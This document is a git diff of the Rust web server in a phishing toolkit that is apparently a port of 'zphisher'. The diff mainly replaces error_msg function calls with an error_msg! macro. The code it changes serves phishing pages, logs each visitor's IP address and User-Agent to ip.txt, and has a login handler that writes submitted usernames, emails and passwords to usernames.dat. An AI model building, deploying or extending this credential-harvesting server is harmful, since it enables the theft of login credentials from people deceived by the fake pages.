@@ -4,7 +4,7 @@ use std::path::PathBuf;
 use std::process::exit;
 use actix_files::NamedFile;
 use actix_web::{get, post, middleware, http, web, App, HttpRequest, HttpResponse, HttpServer, Responder};
-use crate::cli::{clear_terminal, error_msg, notify_msg};
+use crate::cli::{clear_terminal, notify_msg};
 use actix_cors::Cors;
 use actix_web::http::header;
 use actix_web::http::header::HeaderValue;
@@ -13,6 +13,7 @@ use colored::Colorize;
 use crate::constants::{HOST, PORT};
 use crate::zphisher::banner_small;
 use serde::Deserialize;
+use crate::error_msg;
 use crate::helpers::get_data_dir;
 
 
@@ -23,7 +24,7 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
         Some(user_agent) => match user_agent.to_str() {
             Ok(user_agent) => user_agent,
             Err(err) => {
-                error_msg(&err.to_string());
+                error_msg!(&err.to_string());
                 exit(1);
             }
         },
@@ -36,7 +37,7 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
     let ip_dir = match get_data_dir() {
         Some(auth_dir) => auth_dir,
         None => {
-            error_msg("Unable to get data directory");
+            error_msg!("Unable to get data directory");
             exit(1);
         }
     }.join("zphisher").join("auth").join("ip.txt");
@@ -44,20 +45,20 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
     // Create ip.txt file if it doesn't exist
     if !ip_dir.exists() {
         if let Err(e) = OpenOptions::new().write(true).create(true).open(&ip_dir) {
-            error_msg(&format!("Couldn't create ip.txt file: {}", e));
+            error_msg!(&format!("Couldn't create ip.txt file: {}", e));
             exit(1);
         }
     }
 
     let mut file = OpenOptions::new().write(true).append(true).open(&ip_dir).unwrap_or_else(|err| {
-        error_msg(&format!("Couldn't open ip.txt file: {}", err));
+        error_msg!(&format!("Couldn't open ip.txt file: {}", err));
         exit(1);
     });
 
     let formatted_ip = format!("IP: {}\nUser-Agent: {}", client_ip, user_agent);
 
     if let Err(e) = writeln!(file, "{}", formatted_ip) {
-        error_msg(&format!("Couldn't write to file: {}", e));
+        error_msg!(&format!("Couldn't write to file: {}", e));
         exit(1);
     }
 
@@ -72,7 +73,7 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
         Some(user_agent) => match user_agent.to_str() {
             Ok(user_agent) => user_agent,
             Err(err) => {
-                error_msg(&err.to_string());
+                error_msg!(&err.to_string());
                 exit(1);
             }
         },
@@ -92,7 +93,7 @@ async fn index(req: HttpRequest, data: Data<PathBuf>) -> impl Responder {
     let file = match NamedFile::open(file_path) {
         Ok(file) => file,
         Err(err) => {
-            error_msg(&err.to_string());
+            error_msg!(&err.to_string());
             exit(1);
         }
     };
@@ -131,7 +132,7 @@ async fn login(
     let data_dir = match get_data_dir() {
         Some(auth_dir) => auth_dir,
         None => {
-            error_msg("Unable to get data directory");
+            error_msg!("Unable to get data directory");
             exit(1);
         }
     }.join("zphisher").join("auth").join("usernames.dat");
@@ -139,13 +140,13 @@ async fn login(
 
     if !data_dir.exists() {
         if let Err(e) = OpenOptions::new().write(true).create(true).open(&data_dir) {
-            error_msg(&format!("Couldn't create usernames.dat file: {}", e));
+            error_msg!(&format!("Couldn't create usernames.dat file: {}", e));
             exit(1);
         }
     }
 
     let mut file = OpenOptions::new().write(true).append(true).open(&data_dir).unwrap_or_else(|err| {
-        error_msg(&format!("Couldn't open usernames.dat file: {}", err));
+        error_msg!(&format!("Couldn't open usernames.dat file: {}", err));
         exit(1);
     });
 
@@ -158,7 +159,7 @@ async fn login(
         match writeln!(file, "Account: {}", username) {
             Ok(_) => {}
             Err(e) => {
-                error_msg(&format!("Couldn't write to file: {}", e));
+                error_msg!(&format!("Couldn't write to file: {}", e));
                 exit(1);
             }
         };
@@ -170,7 +171,7 @@ async fn login(
         match writeln!(file, "Account: {}", email) {
             Ok(_) => {}
             Err(e) => {
-                error_msg(&format!("Couldn't write to file: {}", e));
+                error_msg!(&format!("Couldn't write to file: {}", e));
                 exit(1);
             }
         };
@@ -182,7 +183,7 @@ async fn login(
     match writeln!(file, "Password: {}", &form.password) {
         Ok(_) => {}
         Err(e) => {
-            error_msg(&format!("Couldn't write to file: {}", e));
+            error_msg!(&format!("Couldn't write to file: {}", e));
             exit(1);
         }
     };
@@ -223,7 +224,7 @@ pub async fn start_webserver(static_files: PathBuf, port: Option<u16>, redirect_
     match clear_terminal() {
         Ok(_) => {}
         Err(err) => {
-            error_msg(&err.to_string());
+            error_msg!(&err.to_string());
             exit(1);
         }
     }
